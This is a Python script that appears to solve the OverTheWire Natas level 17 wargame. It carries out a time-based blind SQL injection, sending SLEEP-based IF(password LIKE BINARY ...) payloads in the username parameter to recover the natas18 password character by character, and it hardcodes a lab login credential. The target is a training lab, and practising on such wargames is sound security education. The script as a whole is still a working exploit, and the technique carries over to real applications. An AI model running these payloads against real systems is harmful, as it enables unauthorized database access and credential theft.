import requests

# Constants
BASE_URL = "http://natas17.natas.labs.overthewire.org"
BASE_USERNAME = "natas17"
BASE_PASSWORD = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
CHARSET = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
SLEEP_TIME = 15
PASSWORD_LENGTH = 32

# Derive possible charset based on time delay
possible_charset = ''
for char in CHARSET:
    print(f'trying {char}')
    payload = f'natas18" AND IF(password LIKE BINARY "%{char}%", SLEEP({SLEEP_TIME}), 1)#'
    response = requests.get(BASE_URL, auth=(BASE_USERNAME, BASE_PASSWORD), params={"username": payload})
    elapsed_time = response.elapsed.total_seconds()

    if elapsed_time >= SLEEP_TIME:
        possible_charset += char
        print(f'Possible Characters: {possible_charset.ljust(len(CHARSET), "*")}')

print("Starting to guess password")

# Guess the password
password = ''
while len(password) < PASSWORD_LENGTH:
    for char in possible_charset:
        print(f'trying {char}')
        test_password = password + char
        payload = f'natas18" AND IF(password LIKE BINARY "{test_password}%", SLEEP({SLEEP_TIME}), 1)#'
        response = requests.get(BASE_URL, auth=(BASE_USERNAME, BASE_PASSWORD), params={"username": payload})
        elapsed_time = response.elapsed.total_seconds()

        if elapsed_time >= SLEEP_TIME:
            password = test_password
            print(f'Password so far: {password.ljust(PASSWORD_LENGTH, "*")}')
            break

print(f'Final password: {password}')
